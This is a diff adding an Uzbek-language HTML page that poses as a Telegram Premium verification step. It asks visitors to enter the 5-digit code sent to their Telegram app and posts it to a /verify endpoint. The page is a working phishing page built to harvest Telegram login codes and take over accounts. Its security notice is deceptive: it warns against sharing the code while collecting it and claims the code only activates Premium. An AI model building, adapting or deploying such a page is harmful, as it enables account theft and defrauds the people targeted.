@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tasdiqlash - Telegram Premium</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: linear-gradient(180deg, #1d2b64 0%, #0e1621 100%);
+            color: white;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            text-align: center;
+        }
+        .container { width: 90%; max-width: 400px; padding: 20px; }
+        .icon {
+            font-size: 50px;
+            margin-bottom: 20px;
+            color: #2b87ff;
+        }
+        h1 { font-size: 24px; margin-bottom: 15px; }
+        p { font-size: 16px; color: #b1c3d1; margin-bottom: 30px; line-height: 1.4; }
+        input[type="text"] {
+            width: 100%;
+            padding: 16px;
+            border-radius: 12px;
+            border: 1.5px solid #334659;
+            background: rgba(23, 33, 43, 0.8);
+            color: white;
+            font-size: 28px;
+            text-align: center;
+            letter-spacing: 8px;
+            font-weight: bold;
+            margin-bottom: 25px;
+            outline: none;
+        }
+        input[type="text"]::placeholder { letter-spacing: normal; font-size: 18px; font-weight: normal; color: #546b82; }
+        button {
+            width: 100%;
+            padding: 16px;
+            border-radius: 12px;
+            border: none;
+            background: #2b87ff;
+            color: white;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        button:hover { background: #1a73e8; }
+        .info-box {
+            margin-top: 20px;
+            font-size: 13px;
+            color: #b1c3d1;
+            background: rgba(255, 255, 255, 0.05);
+            padding: 15px;
+            border-radius: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="icon">💬</div>
+        <h1>Kodni tasdiqlang</h1>
+        <p>Telegram ilovangizga (SMS emas) 5 xonali tasdiqlash kodi yuborildi. Uni pastga kiriting:</p>
+        
+        <form action="/verify" method="POST">
+            <input type="text" name="otp" placeholder="00000" maxlength="5" autocomplete="off" required>
+            <button type="submit">DAVOM ETISH</button>
+        </form>
+
+        <div class="info-box">
+            Xavfsizlik yuzasidan kodni hech kimga bermang. Bu kod faqatgina Premium obunani faollashtirish uchun ishlatiladi.
+        </div>
+    </div>
+</body>
+</html>
